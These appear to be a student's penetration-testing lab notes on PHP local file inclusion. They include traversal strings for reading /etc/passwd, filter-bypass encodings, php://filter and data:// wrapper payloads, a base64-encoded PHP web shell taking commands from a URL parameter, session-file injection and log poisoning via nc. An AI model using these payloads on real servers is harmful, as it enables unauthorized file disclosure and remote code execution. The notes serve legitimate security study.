![[target files.png]]

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
### Tricks

* %00 - PHP stops reading file path and name, e. g. ../../../etc/passwd%00.php
* ....//....//....//etc/passwd - to bypass auto replace


##### PHP Wrappers

* `php://filter/convert.base64-encode/resource=/etc/passwd`
* `data:text/plain,<?php%20phpinfo();%20?>`

![[php filter.png]]


![[file links.png]]
We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`



#### Obfuscation
1. **URL Encoded Bypass:** The attacker can use the URL-encoded version of the payload like `?file=%2e%2e%2fconfig.php`. The server decodes this input to `../config.php`, bypassing the filter.
    
2. **Double Encoded Bypass:** The attacker can use double encoding if the application decodes inputs twice. The payload would then be `?file=%252e%252e%252fconfig.php`, where a dot is `%252e`, and a slash is `%252f`. The first decoding step changes `%252e%252e%252f` to `%2e%2e%2f`. The second decoding step then translates it to `../config.php`.
    
3. **Obfuscation:** An attacker could use the payload `....//config.php`, which, after the application strips out the apparent traversal string, would effectively become `../config.php`.
###### Session files
1. Inject `<?php echo phpinfo(); ?>` into session.
2. Access URL to execute the code:
`sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`

###### Log poisoning
```php
$ nc MACHINE_IP 80      
<?php echo phpinfo(); ?>
```

Then using LFI access the log file.


